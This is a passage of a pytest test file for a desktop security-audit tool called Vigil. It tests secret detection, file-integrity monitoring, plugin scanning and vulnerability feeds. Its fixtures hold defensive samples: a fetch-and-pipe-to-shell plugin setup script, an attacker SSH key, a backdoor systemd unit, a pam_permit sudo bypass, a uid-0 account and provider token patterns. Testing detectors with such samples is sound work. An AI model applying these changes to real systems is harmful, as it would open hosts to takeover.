    homefile(v, ".bash_history", "ls\ncurl -H 'Authorization: token %s' https://api.github.com\ncd\n" % token, 0o600)
    c = v.check_secrets()
    assert c["status"] == "warn" and "~/.bash_history, line 2" in c["detail"] and "GitHub token" in c["detail"]
    assert token not in json.dumps(c)



def test_loose_credential_files(v):
    homefile(v, ".aws/credentials", "[default]\n", 0o644)
    c = v.check_secrets()
    assert c["status"] == "warn" and c["fix"]["action"] == "credential-perms"
    assert v.run_fix("credential-perms")["ok"]
    assert stat.S_IMODE(os.stat(os.path.join(v.HOME, ".aws/credentials")).st_mode) == 0o600
    assert v.check_secrets()["status"] == "pass"


def test_credential_perms_never_follows_symlinks(v, tmp_path):
    target = put(tmp_path / "elsewhere", "x", 0o644)
    os.symlink(target, os.path.join(v.HOME, ".netrc"))
    v.run_fix("credential-perms")
    assert stat.S_IMODE(target.stat().st_mode) == 0o644



def test_file_changes_baseline_then_change_then_accept(v):
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\n")
    homefile(v, ".ssh/authorized_keys", "ssh-ed25519 AAAA me\n", 0o600)
    first = v.check_file_changes()
    assert first["status"] == "pass" and "Baseline recorded" in first["summary"]
    assert v.check_file_changes()["status"] == "pass"
    homefile(v, ".ssh/authorized_keys", "ssh-ed25519 AAAA me\nssh-ed25519 BBBB attacker\n", 0o600)
    sysfile(v, "/etc/systemd/system/backdoor.service", "[Service]\nExecStart=/tmp/x\n")
    c = v.check_file_changes()
    assert c["status"] == "warn" and "changed: ~/.ssh/authorized_keys" in c["detail"]
    assert "new: /etc/systemd/system/backdoor.service" in c["detail"]
    assert c["fix"]["action"] == "integrity-accept"
    assert v.run_fix("integrity-accept")["ok"]
    assert v.check_file_changes()["status"] == "pass"


def test_file_changes_symlinks_recorded_not_followed(v, tmp_path):
    target = put(tmp_path / "unit", "a")
    os.makedirs(v.ROOT + "/etc/systemd/system")
    os.symlink(target, v.ROOT + "/etc/systemd/system/alias.service")
    v.check_file_changes()
    target.write_text("b")                               # target changes, link does not
    assert v.check_file_changes()["status"] == "pass"


def test_file_changes_peek_does_not_create_baseline(v):
    v.audit(peek=True)
    assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil/baseline.json"))




def test_arch_audit_parse():
    mod = load_vigil()
    got = mod.parse_arch_audit(ARCH_AUDIT_JSON)
    assert [p["name"] for p in got] == ["openssl", "libfoo"]
    assert got[0] == {"name": "openssl", "severity": "High", "fixed": True, "issues": 2}
    assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None




def test_clamui_quarantine_count(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    for n in ("a.qtn", "b.qtn"):
        homefile(v, ".local/share/clamui/quarantine/" + n, "x", 0o600)
    c = v.check_clamui()
    assert "2 files in quarantine" in c["summary"]


def test_plugin_scan_says_when_it_did_not_scan(v, tmp_path):
    checkout = tmp_path / "checkout"
    put(checkout / "Panel.qml", 'Process { command: ["curl", url] }\n')
    put(checkout / "manifest.json", json.dumps({"name": "Dev Plugin"}))
    base = Path(v.HOME, ".config/omarchy/plugins")
    base.mkdir(parents=True)
    os.symlink(checkout, base / "me.dev")
    c = v.check_plugins()
    assert "Dev Plugin (me.dev): linked from another folder (development install), not scanned" in c["detail"]
    assert "no network" not in c["detail"]


# --------------------------------------------------------------------------
# Maintained sources (feeds) and the false-positive rules

ARCH_AUDIT_JSON = json.dumps({"avgs": [
    {"name": "AVG-1", "packages": ["openssl"], "status": "Vulnerable", "type": "x", "severity": "High",
     "fixed": "3.4.1-1", "issues": ["CVE-2026-1", "CVE-2026-2"]},
    {"name": "AVG-2", "packages": ["libfoo", "../evil"], "status": "Vulnerable", "type": "x", "severity": "Low",
     "fixed": None, "issues": ["CVE-2026-3"]},
]})


def test_no_hand_made_threat_lists():
    assert not (REPO / "data" / "known-bad.json").exists()
    src = (REPO / "bin" / "vigil").read_text()
    assert "known_bad" not in src and "systemd-initd" not in src


def test_disk_encryption_reads_dm_uuid(v, monkeypatch):
    sysfile(v, "/proc/self/mountinfo", "26 1 254:0 / / rw,relatime - btrfs /dev/mapper/root rw\n")
    monkeypatch.setattr(v, "_rdev", lambda p: os.makedev(254, 0) if p.endswith("/dev/mapper/root") else 0)
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "CRYPT-LUKS2-abc-root\n")
    assert v.check_disk_encryption()["status"] == "pass"
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "LVM-xyz\n")
    c = v.check_disk_encryption()
    assert c["status"] == "warn" and v.dismissible(dict(c))   # true, but only a reinstall fixes it
    os.makedirs(v.ROOT + "/sys/dev/block/254:0/slaves/dm-1")
    sysfile(v, "/sys/dev/block/254:0/slaves/dm-1/dev", "254:1\n")
    sysfile(v, "/sys/dev/block/254:1/dm/uuid", "CRYPT-LUKS2-def\n")
    assert v.check_disk_encryption()["status"] == "pass"


def clamav(v):
    return [f for f in v.CHECKS if f.__name__ == "check_scanner_clamav"][0]


def test_clamav_signatures_come_from_freshclam(v):
    assert clamav(v)()["fix"]["action"] == "install-clamav"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    c = clamav(v)()
    assert c["status"] == "warn" and c["fix"]["action"] == "freshclam-service"
    sysfile(v, "/var/lib/clamav/daily.cld", "")
    c = clamav(v)()
    assert c["status"] == "info" and c["fix"]["action"] == "freshclam-service"
    v.UNITS[("is-enabled", "clamav-freshclam.service")] = "enabled"
    c = clamav(v)()
    assert c["status"] == "info" and "update automatically" in c["summary"] and c["fix"]["action"] == "scan-downloads"
    p = v.ROOT + "/var/lib/clamav/daily.cld"
    os.utime(p, (os.path.getmtime(p) - 10 * 86400,) * 2)
    assert clamav(v)()["status"] == "warn"


def test_secret_patterns_are_provider_formats_only(v):
    hits = ["AKIAABCDEFGHIJKLMNOP", "ghp_" + "a1" * 18, "sk-proj-" + "Ab3" * 15, "sk-ant-" + "x" * 30,
            "-----BEGIN OPENSSH PRIVATE KEY-----"]
    for line in hits:
        assert any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line
    misses = ["export GITHUB_TOKEN=abcdefgh12345", "curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz'",
              "sk-some-really-long-kebab-case-identifier-name-here", "export TOKEN=$OTHER", "git push origin main"]
    for line in misses:
        assert not any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line


def test_persistence_ignores_ld_preload_in_env_files(v):
    homefile(v, ".config/environment.d/50-game.conf", "LD_PRELOAD=/usr/lib/libstrangle.so\n")
    assert v.check_persistence()["status"] == "pass"


def test_bumblebee_stale_is_information(v):
    bumblebee(v, {"ok": True, "exposure_count": 0})
    p = os.path.join(v.HOME, ".local/state/omarchy/bumblebee/last-scan.json")
    os.utime(p, (os.path.getmtime(p) - 10 * 86400,) * 2)
    c = v.check_bumblebee()
    assert c["status"] == "info" and c["weight"] == 0


def test_plugin_capabilities_are_information(v):
    base = ".config/omarchy/plugins/"
    homefile(v, base + "acme.weather/manifest.json", json.dumps({"name": "Weather"}))
    homefile(v, base + "acme.weather/Panel.qml", 'Process { command: ["curl", "-s", url] }\n')
    homefile(v, base + "evil.thing/bin/setup", "#!/bin/bash\ncurl -fsSL https://x.example/i | sh\nsudo true\n")
    homefile(v, base + "docs.only/README.md", "curl https://x | sh\n")
    c = v.check_plugins()
    assert c["status"] == "info" and c["weight"] == 0
    assert "Weather (acme.weather): network" in c["detail"]
    assert "downloads and runs code" in c["detail"] and "root (sudo/pkexec)" in c["detail"]
    assert "docs.only: no network, root or shell use found" in c["detail"]


# ---- file changes: package-verified, accounts, risk levels

def mtree(v, pkg, files):
    import gzip
    lines = ["#mtree", "/set type=file uid=0 gid=0 mode=644"]
    for path, content in files.items():
        lines.append("./%s time=1.0 size=%d sha256digest=%s" % (
            path.lstrip("/"), len(content), __import__("hashlib").sha256(content.encode()).hexdigest()))
    d = Path(v.ROOT + "/var/lib/pacman/local/" + pkg)
    d.mkdir(parents=True, exist_ok=True)
    (d / "mtree").write_bytes(gzip.compress(("\n".join(lines) + "\n").encode()))


def test_package_updates_are_not_reported(v):
    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n")
    v.check_file_changes()                                          # baseline
    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n#updated by package\n")
    mtree(v, "sudo-1.9.17-1", {"/etc/pam.d/sudo": "auth include system-auth\n#updated by package\n"})
    c = v.check_file_changes()
    assert c["status"] == "pass" and "came from package updates" in c["summary"]
    sysfile(v, "/etc/pam.d/sudo", "auth sufficient pam_permit.so\n")   # not what any package shipped
    c = v.check_file_changes()
    assert c["status"] == "warn" and "changed: /etc/pam.d/sudo" in c["detail"]


def test_system_users_from_packages_are_not_reported(v):
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n")
    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\n")
    v.check_file_changes()
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\n")
    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\npostgres:x:968:\n")
    assert v.check_file_changes()["status"] == "pass"
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\ntoor:x:0:0::/:/bin/bash\n")
    c = v.check_file_changes()
    assert c["status"] == "warn" and "/etc/passwd" in c["detail"]


def test_group_membership_change_is_reported(v):
    sysfile(v, "/etc/group", "wheel:x:998:alice\n")
    v.check_file_changes()
    sysfile(v, "/etc/group", "wheel:x:998:alice,mallory\n")
    assert v.check_file_changes()["status"] == "warn"


def test_own_shell_files_are_information_only(v):
    homefile(v, ".bashrc", "alias ll='ls -l'\n")
    v.check_file_changes()
    homefile(v, ".bashrc", "alias ll='ls -la'\n")
    c = v.check_file_changes()
    assert c["status"] == "info" and c["weight"] == 0 and c["fix"]["action"] == "integrity-accept"


def test_vigil_own_files_are_not_watched(v):
    v.check_file_changes()
    assert v.run_fix("optout-on")["ok"]
    assert v.check_file_changes()["status"] == "pass"


def test_hosts_file_is_not_watched(v):
    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n")
    v.check_file_changes()
    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n0.0.0.0 telemetry.example\n")
    assert v.check_file_changes()["status"] == "pass"


# ---- feeds

def test_arch_audit_parse():
    mod = load_vigil()
    got = mod.parse_arch_audit(ARCH_AUDIT_JSON)
    assert [p["name"] for p in got] == ["openssl", "libfoo"]
    assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None


def arch_audit_check(v):
    spec = [s for s in v.SCANNERS if s[0] == "arch-audit"][0]
    return v._scanner_check(*spec)


def test_arch_audit_feed_only_counts_what_an_update_fixes(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    c = arch_audit_check(v)
    assert c["status"] == "info" and c["fix"]["action"] == "arch-audit-refresh"
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    assert v.run_fix("arch-audit-refresh")["ok"]
    c = arch_audit_check(v)
    assert c["status"] == "warn" and c["fix"]["action"] == "update" and "1 serious" in c["summary"]
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    assert arch_audit_check(v)["status"] == "pass"


def test_feed_due_and_retry(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.feed_due("arch-audit") is True
    res = v.refresh_due_feeds()                           # fake run fails: (None, "")
    assert res["ok"] is False and "tries again tomorrow" in res["message"]
    assert v.feed_due("arch-audit") is False              # tried today, waits a day
    p = Path(v.HOME, ".local/state/omarchy-vigil/arch-audit.json")
    meta = json.loads(p.read_text())
    meta["attempted"] = "2020-01-01"
    p.write_text(json.dumps(meta))
    assert v.feed_due("arch-audit") is True
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    assert v.refresh_due_feeds()["ok"] is True
    assert v.feed_due("arch-audit") is False
    meta = json.loads(p.read_text())
    meta["at"] = "2020-01-01"
    meta["attempted"] = "2020-01-01"
    p.write_text(json.dumps(meta))
    assert v.feed_due("arch-audit") is True               # a week or more old


def test_failed_refresh_keeps_last_good_result(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    v.run_fix("arch-audit-refresh")
    del v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")]
    assert v.run_fix("arch-audit-refresh")["ok"] is False
    assert arch_audit_check(v)["status"] == "warn"


def test_report_says_when_feeds_are_due(v):
    assert v.audit(peek=True)["feedsDue"] is False
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.audit(peek=True)["feedsDue"] is True


OSV_JSON = json.dumps({"results": [
    {"source": {"path": "/HOME/.cache/yay/atomic-pkg/bun.lock", "type": "lockfile"},
     "packages": [
         {"package": {"name": "js-digest", "version": "1.0.4", "ecosystem": "npm"},
          "vulnerabilities": [{"id": "GHSA-xxxx-yyyy-zzzz", "aliases": ["MAL-2026-1234"]}]},
         {"package": {"name": "lodash", "version": "4.17.20", "ecosystem": "npm"},
          "vulnerabilities": [{"id": "GHSA-35jh-r3h4-6jhm", "aliases": ["CVE-2021-23337"]}]},
     ]}]})


def test_osv_only_counts_confirmed_malware():
    mod = load_vigil()
    got = mod.parse_osv(OSV_JSON)
    assert [(m["name"], m["id"]) for m in got] == [("js-digest", "MAL-2026-1234")]
    assert mod.parse_osv("nope") is None and mod.parse_osv('{"results": "x"}') is None


def test_osv_check_states(v):
    c = v.check_osv()
    assert c["status"] == "info" and c["fix"]["action"] == "install-osv-scanner"
    v.TRUSTED.add(v.ROOT + "/usr/bin/osv-scanner")
    assert v.check_osv()["status"] == "pass"              # nothing to scan
    yay = os.path.join(v.HOME, ".cache/yay")
    os.makedirs(yay)
    assert v.check_osv()["fix"]["action"] == "osv-refresh"
    argv = ("/usr/bin/osv-scanner", "--format", "json", "--no-resolve", "--recursive", "--", yay)
    v.COMMANDS[argv] = (1, OSV_JSON.replace("/HOME", v.HOME))
    assert v.run_fix("osv-refresh")["ok"]
    c = v.check_osv()
    assert c["status"] == "fail" and "js-digest 1.0.4 (npm, MAL-2026-1234) in ~/.cache/yay/atomic-pkg/bun.lock" in c["detail"]
    assert "lodash" not in c["detail"]
    v.COMMANDS[argv] = (128, "")                          # no lockfiles found
    v.run_fix("osv-refresh")
    assert v.check_osv()["status"] == "pass"


def aur_url(names):
    return "https://aur.archlinux.org/rpc/v5/info?" + "&".join("arg%5B%5D=" + v_pct(n) for n in names)


def v_pct(n):
    return "".join(c if c in "abcdefghijklmnopqrstuvwxyz0123456789._-" else "%%%02X" % ord(c) for c in n)


def test_aur_status_is_information_only(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\nold-thing\nmoved-pkg\norphan-pkg\nlibc++\n")
    url = aur_url(["yay", "old-thing", "moved-pkg", "orphan-pkg", "libc++"])
    assert "libc%2B%2B" in url
    curl = ("/usr/bin/curl", "-q", "-sS", "--fail", "--proto", "=https", "--proto-redir", "=https",
            "--max-time", "30", "--max-filesize", str(4 * 1024 * 1024), "--", url)
    v.COMMANDS[curl] = (0, json.dumps({"results": [
        {"Name": "yay", "Maintainer": "jguer"}, {"Name": "orphan-pkg", "Maintainer": None},
        {"Name": "libc++", "Maintainer": "someone"}]}))
    v.COMMANDS[("/usr/bin/pacman", "-Slq")] = (0, "bash\nmoved-pkg\n")
    assert v.run_fix("aur-refresh")["ok"]
    c = v.check_aur_status()
    assert c["status"] == "info" and c["weight"] == 0
    assert "no longer in the AUR: old-thing" in c["detail"]
    assert "now in the official repositories: moved-pkg" in c["detail"]
    assert "no maintainer (orphaned): orphan-pkg" in c["detail"]


def test_aur_refresh_failure_is_retried(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\n")
    assert v.run_fix("aur-refresh")["ok"] is False        # curl fake returns nothing
    assert v.check_aur_status()["status"] == "info" and v.feed_due("aur") is False


# --------------------------------------------------------------------------
# Weekly virus scan and the Update and check everything button

def scan_argv(v):
    return ("/usr/bin/clamscan", "--recursive", "--infected", "--no-summary", "--stdout", "--",
            os.path.join(v.HOME, "Downloads"))


def test_clamscan_parse():
    mod = load_vigil()
    mod.HOME = "/home/alice"
    out = ("/home/alice/Downloads/invoice.pdf.exe: Win.Trojan.Agent-123 FOUND\n"
           "/home/alice/Downloads/odd: name: with colons.zip: Eicar-Signature FOUND\n"
           "/home/alice/Downloads/<b>x</b>: Bad sig with spaces FOUND\n"
           "some warning line\n")
    got = mod.parse_clamscan(out)
    assert got == [{"path": "~/Downloads/invoice.pdf.exe", "signature": "Win.Trojan.Agent-123"},
                   {"path": "~/Downloads/odd: name: with colons.zip", "signature": "Eicar-Signature"}]


def test_virus_scan_states(v):
    assert v.check_virus_scan()["status"] == "info"                       # no ClamAV
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    assert v.check_virus_scan()["status"] == "na"                         # no Downloads
    os.makedirs(os.path.join(v.HOME, "Downloads"))
    c = v.check_virus_scan()
    assert c["status"] == "info" and c["fix"]["action"] == "virus-scan-now"
    v.COMMANDS[scan_argv(v)] = (1, os.path.join(v.HOME, "Downloads/x.exe") + ": Win.Test.EICAR_HDB-1 FOUND\n")
    assert v.run_fix("virus-scan-now")["ok"]
    c = v.check_virus_scan()
    assert c["status"] == "fail" and "~/Downloads/x.exe: Win.Test.EICAR_HDB-1" in c["detail"]
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    assert v.check_virus_scan()["fix"]["kind"] == "app"                   # hand off quarantine to ClamUI
    v.COMMANDS[scan_argv(v)] = (0, "")
    v.run_fix("virus-scan-now")
    assert v.check_virus_scan()["status"] == "pass"


def test_virus_scan_error_is_not_a_clean_result(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    os.makedirs(os.path.join(v.HOME, "Downloads"))
    v.COMMANDS[scan_argv(v)] = (2, "LibClamAV Error: cli_loaddbdir(): No supported database files found\n")
    assert v.run_fix("virus-scan-now")["ok"] is False
    assert v.check_virus_scan()["status"] == "info"                       # still "first scan pending"


def test_force_refresh_runs_everything_available(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/arch-audit", v.ROOT + "/usr/bin/clamscan"}
    os.makedirs(os.path.join(v.HOME, "Downloads"))
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.COMMANDS[scan_argv(v)] = (0, "")
    assert v.refresh_due_feeds()["ok"]                                    # first run: both due
    assert v.refresh_due_feeds()["message"] == "Everything is up to date."
    res = v.refresh_due_feeds(force=True)                                 # the button ignores "due"
    assert res["message"] == ("Refreshed the Arch vulnerability database and scanned Downloads. "
                              "Nothing on this machine needs attention.")


def test_force_refresh_with_nothing_installed_says_how_to_start(v):
    res = v.refresh_due_feeds(force=True)
    assert res["ok"] and "Install the tools" in res["message"]


def test_feeds_updated_is_oldest_completed_source(v):
    assert v.feeds_updated() == ""
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.feeds_updated() == ""                                        # available but never completed
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2}", v.feeds_updated())
    assert v.audit(peek=True)["feedsUpdated"] == v.feeds_updated()


def test_cli_refresh_feeds_arguments():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["refresh-feeds", "--all"], ["refresh-feeds", "--force", "x"]):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Source dates and the last full update, shown on the Overview

def test_source_status_lists_only_what_is_set_up(v):
    assert v.source_status() == []
    v.TRUSTED |= {v.ROOT + "/usr/bin/clamscan", v.ROOT + "/usr/bin/arch-audit"}
    os.makedirs(os.path.join(v.HOME, "Downloads"))
    got = {s["id"]: s for s in v.source_status()}
    assert set(got) == {"signatures", "virus-scan", "arch-audit"}
    assert got["signatures"]["state"] == "never" and got["arch-audit"]["state"] == "never"
    sysfile(v, "/var/lib/clamav/daily.cld", "")
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    got = {s["id"]: s for s in v.source_status()}
    assert got["signatures"]["state"] == "ok" and got["arch-audit"]["state"] == "ok"
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2}", got["arch-audit"]["date"])


def test_source_status_failed_and_stale(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    p = Path(v.HOME, ".local/state/omarchy-vigil/arch-audit.json")
    p.parent.mkdir(parents=True)
    p.write_text(json.dumps({"at": "2026-01-01", "attempted": "2026-01-05", "packages": []}))
    s = v.source_status()[0]
    assert s["state"] == "failed" and s["date"] == "2026-01-01" and s["tried"] == "2026-01-05"
    p.write_text(json.dumps({"at": "2020-01-01", "attempted": "2020-01-01", "packages": []}))
    assert v.source_status()[0]["state"] == "stale"
    sysfile(v, "/var/lib/clamav/daily.cld", "")
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    f = v.ROOT + "/var/lib/clamav/daily.cld"
    os.utime(f, (os.path.getmtime(f) - 20 * 86400,) * 2)
    assert {s["id"]: s for s in v.source_status()}["signatures"]["state"] == "stale"


def test_last_run_recorded(v):
    assert v.last_run() == {"at": "", "ok": False}
    v.refresh_due_feeds(force=True)                       # nothing set up: nothing ran, nothing recorded
    assert v.last_run()["at"] == ""
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    v.refresh_due_feeds(force=True)                       # fails (fake run returns nothing)
    r = v.last_run()
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}", r["at"]) and r["ok"] is False
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.refresh_due_feeds(force=True)
    assert v.last_run()["ok"] is True
    report = v.audit(peek=True)
    assert report["lastRun"]["ok"] is True and [s["id"] for s in report["sources"]] == ["arch-audit"]


def test_update_message_separates_refreshing_from_findings(v):
    """Refreshing a database must never read as finding something."""
    v.TRUSTED |= {v.ROOT + "/usr/bin/arch-audit", v.ROOT + "/usr/bin/clamscan"}
    os.makedirs(os.path.join(v.HOME, "Downloads"))
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    v.COMMANDS[scan_argv(v)] = (1, os.path.join(v.HOME, "Downloads/x.exe") + ": Win.Test.EICAR_HDB-1 FOUND\n")
    msg = v.refresh_due_feeds(force=True)["message"]
    assert msg.startswith("Refreshed the Arch vulnerability database and scanned Downloads.")
    assert "On this machine: updating would fix 2 known vulnerabilities; 1 infected file in Downloads." in msg
    assert v.run_fix("arch-audit-refresh")["message"] == (
        "Vulnerability database refreshed. Updating would fix 2 known vulnerabilities on this machine.")
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    assert v.run_fix("arch-audit-refresh")["message"] == (
        "Vulnerability database refreshed. No updates are waiting that fix a known vulnerability on this machine.")


def test_source_labels_name_the_source_not_a_finding(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/arch-audit", v.ROOT + "/usr/bin/clamscan"}
    os.makedirs(os.path.join(v.HOME, "Downloads"))
    labels = [s["label"] for s in v.source_status()]
    assert labels == ["ClamAV virus signatures", "Downloads virus scan", "Arch vulnerability database"]


def test_warnings_cost_less_than_failures(v):
    warn = v.result("a", "harden", "A", "warn", "x", weight=3)
    fail = v.result("b", "harden", "B", "fail", "x", weight=3)
    assert v.score_of([warn]) == 94 and v.score_of([fail]) == 70


# --------------------------------------------------------------------------
# Lynis: the terminal action copies a few report lines; Vigil lists them.

LYNIS_DAT = """hardening_index=64
report_datetime_end=2026-10-12 10:00:03
warning[]=NETW-2705|Couldn't find 2 responsive nameservers|-|-|
suggestion[]=AUTH-9262|Install a PAM module for password strength testing|-|-|
suggestion[]=AUTH-9262|Install a PAM module for password strength testing|-|-|
suggestion[]=KRNL-6000|One or more sysctl values differ|net.ipv4.conf.all.send_redirects (exp: 0)|-|
suggestion[]=not an id|Should be dropped|-|-|
suggestion[]=BOOT-5122|\x1b[31mcolour\u202e and bidi|-|-|
hostname=should-not-matter
"""


def lynis_check(v):
    return v._scanner_check(*[s for s in v.SCANNERS if s[0] == "lynis"][0])


def test_parse_lynis(v):
    d = v.parse_lynis(LYNIS_DAT)
    assert d["index"] == 64 and d["date"] == "2026-10-12"
    assert [w["id"] for w in d["warnings"]] == ["NETW-2705"]
    assert [s["id"] for s in d["suggestions"]] == ["AUTH-9262", "KRNL-6000", "BOOT-5122"]
    assert d["suggestions"][1]["detail"] == "net.ipv4.conf.all.send_redirects (exp: 0)"
    assert "\x1b" not in d["suggestions"][2]["text"] and "\u202e" not in d["suggestions"][2]["text"]
    assert v.parse_lynis("hardening_index=250\nfoo=bar\n") is None
    assert v.parse_lynis("") is None


def test_lynis_check_lists_findings_without_scoring(v):
    v.TRUSTED.add(v.sys_path("/usr/bin/lynis"))
    c = lynis_check(v)
    assert c["status"] == "info" and "Run it once" in c["summary"] and c["fix"]["action"] == "run-lynis"
    put(Path(v.HOME, ".local/state/omarchy-vigil/lynis.dat"), LYNIS_DAT, 0o600)
    c = lynis_check(v)
    assert c["status"] == "info" and c["weight"] == 0
    assert c["summary"].startswith("Hardening index 64 of 100. 1 warning, 3 suggestions.")
    assert "\u2022 Couldn't find 2 responsive nameservers (NETW-2705)" in c["detail"]
    assert c["fix"]["label"] == "Run again"


def test_lynis_detail_is_capped_with_a_count(v):
    lines = "".join("suggestion[]=TEST-%04d|Suggestion number %d|-|-|\n" % (i, i) for i in range(60))
    shown, covered = v._lynis_fold(v.parse_lynis(lines), None)
    out = v._lynis_detail(shown, covered).splitlines()
    assert len(out) == v.LIST_MAX + 1
    assert out[0].startswith("For any item: sudo lynis show details <ID>")
    assert out[-1].startswith("\u2026 and 23 more.")       # 3 header lines + 37 shown of 60


LYNIS_OVERLAP = """hardening_index=70
warning[]=FIRE-4590|No firewall found|-|-|
suggestion[]=SSH-7408|Consider hardening SSH configuration|MaxAuthTries (6 --> 3)|-|
suggestion[]=AUTH-9262|Install a PAM module for password strength testing|-|Install libpam-passwdqc|
suggestion[]=KRNL-6000|One or more sysctl values differ from the scan profile and could be tweaked||Change sysctl value or disable test (skip-test=KRNL-6000:<sysctl-key>)|
details[]=KRNL-6000|sysctl|desc:Disable sending of redirects;field:net.ipv4.conf.all.send_redirects;prefval:0;value:1;|
details[]=KRNL-6000|sysctl|desc:Log martians;field:net.ipv4.conf.all.log_martians;prefval:1;value:0;|
details[]=SSH-7408|sshd|field:MaxAuthTries;prefval:3;value:6;|
"""


def test_lynis_leaves_out_what_vigil_checks(v):
    shown, covered = v._lynis_fold(v.parse_lynis(LYNIS_OVERLAP), {
        "firewall": "Firewall", "network-hardening": "Network stack"})   # SSH server did not run
    assert covered == ["Firewall", "Network stack"]
    assert shown["warnings"] == []
    ids = [s["id"] for s in shown["suggestions"]]
    assert ids == ["SSH-7408", "AUTH-9262", "KRNL-6000"]
    krnl = shown["suggestions"][2]
    assert "net.ipv4.conf.all.log_martians (Lynis prefers 1, now 0)" in krnl["detail"]
    assert "send_redirects" not in krnl["detail"] and krnl["solution"] == ""
    detail = v._lynis_detail(shown, covered)
    assert "Left out because Vigil already checks them: Firewall, Network stack." in detail
    assert "   Fix: Install libpam-passwdqc" in detail


def test_lynis_sysctl_item_disappears_when_vigil_manages_every_setting(v):
    text = LYNIS_OVERLAP.replace("net.ipv4.conf.all.log_martians", "net.ipv4.tcp_syncookies")
    shown, covered = v._lynis_fold(v.parse_lynis(text), {"network-hardening": "Network stack"})
    assert "KRNL-6000" not in [s["id"] for s in shown["suggestions"]]
    assert covered == ["Network stack"]


def test_audit_folds_lynis_into_vigil_checks(v):
    v.TRUSTED.add(v.sys_path("/usr/bin/lynis"))
    put(Path(v.HOME, ".local/state/omarchy-vigil/lynis.dat"), LYNIS_OVERLAP, 0o600)
    checks = [v.result("firewall", "harden", "Firewall", "warn", "Off."),
              v.result("ssh-server", "harden", "SSH server", "na", "Not installed."),
              lynis_check(v)]
    assert checks[2]["summary"].startswith("Hardening index 70 of 100. 1 warning, 3 suggestions.")
    v.fold_lynis(checks)
    assert checks[2]["summary"].startswith("Hardening index 70 of 100. 0 warnings, 3 suggestions.")
    assert "Left out because Vigil already checks them: Firewall." in checks[2]["detail"]


def test_lynis_copy_must_be_ours(v, tmp_path):
    v.TRUSTED.add(v.sys_path("/usr/bin/lynis"))
    elsewhere = put(tmp_path / "planted.dat", LYNIS_DAT)
    state = Path(v.HOME, ".local/state/omarchy-vigil")
    state.mkdir(parents=True, mode=0o700)
    os.symlink(elsewhere, state / "lynis.dat")
    c = lynis_check(v)
    assert "Run it once" in c["summary"]
